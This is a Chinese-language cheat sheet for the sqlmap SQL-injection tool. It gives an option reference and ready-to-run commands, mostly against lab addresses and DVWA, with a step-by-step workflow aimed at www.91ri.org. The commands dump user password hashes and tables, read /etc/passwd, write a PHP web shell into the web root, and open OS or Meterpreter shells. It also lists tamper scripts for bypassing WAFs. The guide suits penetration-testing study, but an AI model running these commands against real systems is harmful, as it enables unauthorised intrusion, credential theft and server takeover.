-u #注入点
MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxD

-f #指纹判别数据库类型
-b #获取数据库版本信息
-p #指定可测试的参数(?page=1&id=2 -p “page,id”)
-D “” #指定数据库名
-T “” #指定表名
-C “” #指定字段
Options（选项）：
--version #显示程序的版本号并退出
-h, --help #显示此帮助消息并退出
-v VERBOSE #详细级别：0-6（默认为1）:
0：只显示Python的回溯，错误和关键消息。
1：显示信息和警告消息。
2：显示调试消息。
3：有效载荷注入。
4：显示HTTP请求。
5：显示HTTP响应头。
6：显示HTTP响应页面的内容
Target（目标）：以下至少需要设置其中一个选项，设置目标URL
-d DIRECT #直接连接到数据库。
-u URL #--url=URL 目标URL。
-l LIST #从Burp或WebScarab代理的日志中解析目标。
-r REQUESTFILE #从一个文件中载入HTTP请求。
-g GOOGLEDORK #处理Google dork的结果作为目标URL。
-c CONFIGFILE #从INI配置文件中加载选项。
Request（请求）：这些选项可以用来指定如何连接到目标URL
--data=DATA #通过POST发送的数据字符串
--cookie=COOKIE #HTTP Cookie头
--cookie-urlencode #URL 编码生成的cookie注入
--drop-set-cookie #忽略响应的Set - Cookie头信息
--user-agent=AGENT #指定 HTTP User - Agent头
--random-agent #使用随机选定的HTTP User - Agent头
--referer=REFERER #指定 HTTP Referer头
--headers=HEADERS #换行分开，加入其他的HTTP头
--auth-type=ATYPE #HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
--auth-cred=ACRED #HTTP身份验证凭据（用户名:密码）
--auth-cert=ACERT #HTTP认证证书（key_file，cert_file）
--proxy=PROXY #使用HTTP代理连接到目标URL
--proxy-cred=PCRED #HTTP代理身份验证凭据（用户名：密码）
--ignore-proxy #忽略系统默认的HTTP代理
--delay=DELAY #在每个HTTP请求之间的延迟时间，单位为秒
--timeout=TIMEOUT #等待连接超时的时间（默认为30秒）
--retries=RETRIES #连接超时后重新连接的时间（默认3）
--scope=SCOPE #从所提供的代理日志中过滤器目标的正则表达式
--safe-url=SAFURL #在测试过程中经常访问的url地址
--safe-freq=SAFREQ #两次访问之间测试请求，给出安全的URL
Optimization（优化）：这些选项可用于优化SqlMap的性能。
-o #开启所有优化开关
--predict-output #预测常见的查询输出
--keep-alive #使用持久的HTTP（S）连接
--null-connection #从没有实际的HTTP响应体中检索页面长度
--threads=THREADS #最大的HTTP（S）请求并发量（默认为1）
Injection（注入）：
这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
-p #TESTPARAMETER 可测试的参数（S）
--dbms=DBMS #强制后端的DBMS为此值
--os=OS #强制后端的DBMS操作系统为这个值
--prefix=PREFIX #注入payload字符串前缀
--suffix=SUFFIX #注入payload字符串后缀
--tamper=TAMPER #使用给定的脚本（S）篡改注入数据
Detection（检测）：
这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
--level=LEVEL #执行测试的等级（1-5，默认为1）
--risk=RISK #执行测试的风险（0-3，默认为1）
--string=STRING #查询时有效时在页面匹配字符串
--regexp=REGEXP #查询时有效时在页面匹配正则表达式
--text-only #仅基于在文本内容比较网页
Techniques（技巧）：这些选项可用于调整具体的SQL注入测试。
--technique=TECH #SQL注入技术测试（默认BEUST）
--time-sec=TIMESEC #DBMS响应的延迟时间（默认为5秒）
--union-cols=UCOLS #定列范围用于测试UNION查询注入
--union-char=UCHAR #用于暴力猜解列数的字符
Fingerprint（指纹）：
-f, --fingerprint #执行检查广泛的DBMS版本指纹
Enumeration（枚举）：这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。
-b, --banner #检索数据库管理系统的标识
--current-user #检索数据库管理系统当前用户
--current-db #检索数据库管理系统当前数据库
--is-dba #检测DBMS当前用户是否DBA
--users #枚举数据库管理系统用户
--passwords #枚举数据库管理系统用户密码哈希
--privileges #枚举数据库管理系统用户的权限
--roles #枚举数据库管理系统用户的角色
--dbs #枚举数据库管理系统数据库
--tables #枚举的DBMS数据库中的表
--columns #枚举DBMS数据库表列
--dump #转储数据库管理系统的数据库中的表项
--dump-all #转储所有的DBMS数据库表中的条目
--search #搜索列（S），表（S）和/或数据库名称（S）
-D DB #要进行枚举的数据库名
-T TBL #要进行枚举的数据库表
-C COL #要进行枚举的数据库列
-U USER #用来进行枚举的数据库用户
--exclude-sysdbs #枚举表时排除系统数据库
--start=LIMITSTART #第一个查询输出进入检索
--stop=LIMITSTOP #最后查询的输出进入检索
--first=FIRSTCHAR #第一个查询输出字的字符检索
--last=LASTCHAR #最后查询的输出字字符检索
--sql-query=QUERY #要执行的SQL语句
--sql-shell #提示交互式SQL的shell
Brute force（蛮力）：这些选项可以被用来运行蛮力检查。
--common-tables #检查存在共同表
--common-columns #检查存在共同列
User-defined function injection（用户自定义函数注入）：这些选项可以用来创建用户自定义函数。
--udf-inject #注入用户自定义函数
--shared-lib=SHLIB #共享库的本地路径
File system access（访问文件系统）：这些选项可以被用来访问后端数据库管理系统的底层文件系统。
--file-read=RFILE #从后端的数据库管理系统文件系统读取文件
--file-write=WFILE #编辑后端的数据库管理系统文件系统上的本地文件
--file-dest=DFILE #后端的数据库管理系统写入文件的绝对路径
Operating system access（操作系统访问）：这些选项可以用于访问后端数据库管理系统的底层操作系统。
--os-cmd=OSCMD #执行操作系统命令
--os-shell #交互式的操作系统的shell
--os-pwn #获取一个OOB shell，meterpreter或VNC
--os-smbrelay #一键获取一个OOB shell，meterpreter或VNC
--os-bof #存储过程缓冲区溢出利用
--priv-esc #数据库进程用户权限提升
--msf-path=MSFPATH Metasploit #Framework本地的安装路径
--tmp-path=TMPPATH #远程临时文件目录的绝对路径
Windows注册表访问：这些选项可以被用来访问后端数据库管理系统Windows注册表。
--reg-read #读一个Windows注册表项值
--reg-add #写一个Windows注册表项值数据
--reg-del #删除Windows注册表键值
--reg-key=REGKEY #Windows注册表键
--reg-value=REGVAL #Windows注册表项值
--reg-data=REGDATA #Windows注册表键值数据
--reg-type=REGTYPE #Windows注册表项值类型
General（一般）：这些选项可以用来设置一些一般的工作参数。
-t TRAFFICFILE #记录所有HTTP流量到一个文本文件中
-s SESSIONFILE #保存和恢复检索会话文件的所有数据
--flush-session #刷新当前目标的会话文件
--fresh-queries #忽略在会话文件中存储的查询结果
--eta #显示每个输出的预计到达时间
--update #更新SqlMap
--save file #保存选项到INI配置文件
--batch #从不询问用户输入，使用所有默认配置。
Miscellaneous（杂项）：
--beep #发现SQL注入时提醒
--check-payload #IDS对注入payloads的检测测试
--cleanup #SqlMap具体的UDF和表清理DBMS
--forms #对目标URL的解析和测试形式
--gpage=GOOGLEPAGE #从指定的页码使用谷歌dork结果
--page-rank #Google dork结果显示网页排名（PR）
--parse-errors #从响应页面解析数据库管理系统的错误消息
--replicate #复制转储的数据到一个sqlite3数据库
--tor #使用默认的Tor（Vidalia/ Privoxy
–eta #盲注
/pentest/database/sqlmap/txt/
common-columns.txt　　字段字典
common-outputs.txt
common-tables.txt 表字典
keywords.txt
oracle-default-passwords.txt
user-agents.txt
wordlist.txt
常用语句：
1、使用POST方法提交
sqlmap.py -u "http://192.168.1.1/sqlmap/oracle/post_int.php" --method POST --data "id=1"
2、使用COOKIES方式提交,cookie的值用;分割,可以使用TamperData来抓cookies
python sqlmap.py -u "http://192.168.1.1/sqlmap/mssql/cookie_int.php" --cookie "id=1" -v 1
3、使用referer欺骗
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" --referer "http://www.google.com" -v 3
4、使用自定义user-agent,或者使用随机使用自带的user-agents.txt
python sqlmap.py -u "http://192.168.1.1/sqlmap/oracle/get_int.php?id=1" --user-agent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" -v 3
python sqlmap.py -u "URL" -v 1 -a "./txt/user-agents.txt"
5、使用基本认证
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass" -v 3
6、使用Digest认证
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/digest/get_int.php?id=1" --auth-type Digest --auth-cred "testuser:testpass" -v 3
7、使用代理,配合TOR
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:3128"
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" --proxy "http://192.168.1.47:8118"
8、使用多线程猜解
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int.php?id=1" -v 1 --current-user 
--threads 3
9、绕过动态检测,直接指定有注入点的参数,可以使用,分割多个参数,指定user-agent注入
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" -v 1 -p "id
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1&cat=2" -v 1 -p "cat,id"
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/ua_str.php" -v 1 -p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"
10、指定数据库,绕过SQLMAP的自动检测
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" -v 2
 --dbms "PostgreSQL"
* MySQL
* Oracle
* PostgreSQL
* Microsoft SQL Server
11、指定操作系统,绕过SQLMAP自动检测
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_int.php?id=1" -v 2
 --os "Windows"
* Linux
* Windows
12、自定义payload
Options: --prefix and --postfix
13、页面比较
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int_refresh.php?id=1" --string "luther" -v 1
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int_refresh.php?id=1" --regexp "<td>lu[\w][\w]er" -v
14、排除网站的内容
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int_refresh.php?id=1" --excl-reg "Dynamic content: ([\d]+)"
15、多语句测试，php内嵌函数mysql_query(),不支持多语句
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int.php?id=1" --stacked-test -v 1
16、union注入测试
python sqlmap.py -u "http://192.168.1.1/sqlmap/oracle/get_int.php?id=1" --union-test -v 1
17、unionz注入配合orderby
python sqlmap.py -u "http://192.168.1.1/sqlmap/pgsql/get_str.php?id=1" --union-test --union-tech orderby -v 1
python sqlmap.py -u "http://192.168.1.1/sqlmap/mssql/get_int.php?id=1" -v 1 --union-use --banner
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int.php?id=1" -v 5 --union-use --current-user
python sqlmap.py -u "http://192.168.1.1/sqlmap/mysql/get_int_partialunion.php?id=1" -v 1 --union-use --dbs
fingerprint
python sqlmap.py -u "http://192.168.1.1/sqlmap/mssql/get_int.php?id=1" -v 1 -f
python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b
简单的注入流程            #这部分来自: 网络安全攻防研究室(www.91ri.org)
1.读取数据库版本，当前用户，当前数据库
sqlmap -u http://www.91ri.org/ test.php?p=2 -f -b –current-user –current-db -v 1
2.判断当前数据库用户权限
sqlmap -u http://www.91ri.org/ test.php?p=2 –privileges -U 用户名 -v 1
sqlmap -u http://www.91ri.org/ test.php?p=2 –is-dba -U 用户名 -v 1
3.读取所有数据库用户或指定数据库用户的密码
sqlmap -u http://www.91ri.org/ test.php?p=2 –users –passwords -v 2
sqlmap -u http://www.91ri.org/ test.php?p=2 –passwords -U root -v 2
4.获取所有数据库
sqlmap -u http://www.91ri.org/ test.php?p=2 –dbs -v 2
5.获取指定数据库中的所有表
sqlmap -u http://www.91ri.org/ test.php?p=2 –tables -D mysql -v 2
6.获取指定数据库名中指定表的字段
sqlmap -u http://www.91ri.org/ test.php?p=2 –columns -D mysql -T users -v 2
7.获取指定数据库名中指定表中指定字段的数据
sqlmap -u http://www.91ri.org/ test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2
8.file-read读取web文件
sqlmap -u http://www.91ri.org/ test.php?p=2 –file-read “/etc/passwd” -v 2
9.file-write写入文件到web
sqlmap -u http://www.91ri.org/ test.php?p=2 –file-write /localhost/mm.php –file-dest /var/www/html/xx.php -v 2




qlmap支持五种不同的注入模式：

1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。

2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。

3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。

4、联合查询注入，可以使用union的情况下的注入。

5、堆查询注入，可以同时执行多条语句的执行时的注入。




sqlmap支持的数据库有：

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

参数：--level

共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads.xml中看到，你也可以根据相应的格式添加自己的payload。

这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent/Referer头在level为3的时候就会测试。

总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。
风险等级

参数：--risk

共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。

在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。

测试的语句同样可以在xml/payloads.xml中找到，你也可以自行添加payload。


--technique

这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。

支持的探测方式如下：

B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）


--os-cmd
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" \
--os-cmd id -v 1

用--os-shell参数
也可以模拟一个真实的shell，可以输入你想执行的命令。

当不能执行多语句的时候（比如php或者asp的后端数据库为MySQL时），仍然可能使用INTO OUTFILE写进可写目录，来创建一个web后门。支持的语言：

1、ASP
2、ASP.NET
3、JSP
4、PHP




metasploit配合使用
参数：--os-pwn,--os-smbrelay,--os-bof,--priv-esc,--msf-path,--tmp-path

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立TCP连接，这个连接可以是一个交互式命令行的Meterpreter会话，sqlmap根据Metasploit生成shellcode，并有四种方式执行它：

1、通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。
2、通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。
3、通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。
4、通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof


参数：--identify-waf

sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别


模仿智能手机

参数：--mobile

有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。


cookies 注入
­
下面这个例子演示了DVWA (Damn Vulnerable Web Application)的HTTP cookie中名为security的测试。
./sqlmap.py -u ‘http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#’
–cookie=’PHPSESSID=0e4jfbrgd8190ig3uba7rvsip1; security=low’
–string=’First name’ –dbs –level 3 -p PHPSESSID
-string标志比较注入时有效页面和无效页面。另一方面，-dbs标示用来枚举数据库管理系统。最后，-p标示用来表示强制测试PHPSESSID变量。


--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径



apostrophemask.py        用UTF-8全角字符替换单引号字符

02. apostrophenullencode.py        用非法双字节unicode字符替换单引号字符

03. appendnullbyte.py        在payload末尾添加空字符编码

04. base64encode.py        对给定的payload全部字符使用Base64编码

05. between.py        分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”

06. bluecoat.py        在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”

07. chardoubleencode.py        对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）

08. charencode.py        对给定的payload全部字符使用URL编码（不处理已经编码的字符）

09. charunicodeencode.py        对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
10. concat2concatws.py        用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例

11. equaltolike.py        用“LIKE”运算符替换全部等于号“=”

12. greatest.py        用“GREATEST”函数替换大于号“>”

13. halfversionedmorekeywords.py        在每个关键字之前添加MySQL注释

14. ifnull2ifisnull.py        用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例

15. lowercase.py        用小写值替换每个关键字字符

16. modsecurityversioned.py        用注释包围完整的查询

17. modsecurityzeroversioned.py        用当中带有数字零的注释包围完整的查询

18. multiplespaces.py        在SQL关键字周围添加多个空格

19. nonrecursivereplacement.py        用representations替换预定义SQL关键字，适用于过滤器

20. overlongutf8.py        转换给定的payload当中的所有字符

21. percentage.py        在每个字符之前添加一个百分号

22. randomcase.py        随机转换每个关键字字符的大小写

23. randomcomments.py        向SQL关键字中插入随机注释

24. securesphere.py        添加经过特殊构造的字符串

25. sp_password.py        向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs

26. space2comment.py        用“/**/”替换空格符

27. space2dash.py        用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符

28. space2hash.py        用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符

29. space2morehash.py        用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符

30. space2mssqlblank.py        用一组有效的备选字符集当中的随机空白符替换空格符

31. space2mssqlhash.py        用磅注释符“#”其次是一个换行符替换空格符

32. space2mysqlblank.py        用一组有效的备选字符集当中的随机空白符替换空格符

33. space2mysqldash.py        用破折号注释符“--”其次是一个换行符替换空格符
34. space2plus.py        用加号“+”替换空格符
35. space2randomblank.py        用一组有效的备选字符集当中的随机空白符替换空格符

36. unionalltounion.py        用“UNION SELECT”替换“UNION ALL SELECT”

37. unmagicquotes.py        用一个多字节组合%bf%27和末尾通用注释一起替换空格符

38. varnish.py        添加一个HTTP头“X-originating-IP”来绕过WAF

39. versionedkeywords.py        用MySQL注释包围每个非函数关键字

40. versionedmorekeywords.py        用MySQL注释包围每个关键字

41. xforwardedfor.py        添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
